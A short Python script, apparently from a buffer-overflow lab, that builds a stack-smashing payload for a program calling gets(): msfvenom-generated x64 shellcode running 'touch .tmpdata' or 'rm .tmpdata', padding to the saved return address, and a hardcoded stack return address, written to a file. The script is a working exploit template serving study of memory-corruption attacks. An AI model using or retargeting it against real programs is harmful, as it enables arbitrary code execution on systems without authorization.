#!/usr/bin/python3

rbp_size = 8
# get the offset of variable buff relative to rbp (with gdb or objdump etc.):
# lea    -0x70(%rbp),%rax
# mov    %rax,%rdi
# call   0x401060 <gets@plt
stack_size = 0x70 + rbp_size

# msf6 > msfvenom -p linux/x64/exec CMD="touch .tmpdata" -b \x00 -f python
# [*] exec: msfvenom -p linux/x64/exec CMD="touch .tmpdata" -b \x00 -f python
# Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
# [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
# [-] No arch selected, selecting arch: x64 from the payload
# No badchars present in payload, skipping automatic encoding
# No encoder specified, outputting raw payload
# Payload size: 51 bytes
# Final size of python file: 270 bytes
buf =  b""
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
buf += b"\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x0f"
buf += b"\x00\x00\x00\x74\x6f\x75\x63\x68\x20\x2e\x74\x6d"
buf += b"\x70\x64\x61\x74\x61\x00\x56\x57\x54\x5e\x6a\x3b"
buf += b"\x58\x0f\x05"

# msf6 > msfvenom -p linux/x64/exec CMD="rm .tmpdata" -b \x00 -f python
# [*] exec: msfvenom -p linux/x64/exec CMD="rm .tmpdata" -b \x00 -f python
# Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
# [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
# [-] No arch selected, selecting arch: x64 from the payload
# No badchars present in payload, skipping automatic encoding
# No encoder specified, outputting raw payload
# Payload size: 48 bytes
# Final size of python file: 247 bytes
buf2 =  b""
buf2 += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
buf2 += b"\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x0c"
buf2 += b"\x00\x00\x00\x72\x6d\x20\x2e\x74\x6d\x70\x64\x61"
buf2 += b"\x74\x61\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05"

# generate payload-touch
shellcode = buf

# generate payload-rm
#shellcode = buf2

return_addresss = b"\x30\xdc\xff\xff\xff\x7f\x00\x00" # without gdb
#return_addresss = b"\xd0\xdb\xff\xff\xff\x7f\x00\x00" # with gdb

payload = shellcode + b'x' * (stack_size - len(shellcode)) + return_addresss

print(f"payload length:   {len(payload)}")
print(f"shellcode length: {len(shellcode)}")

with open('payload', 'wb') as file:
    file.write(payload)
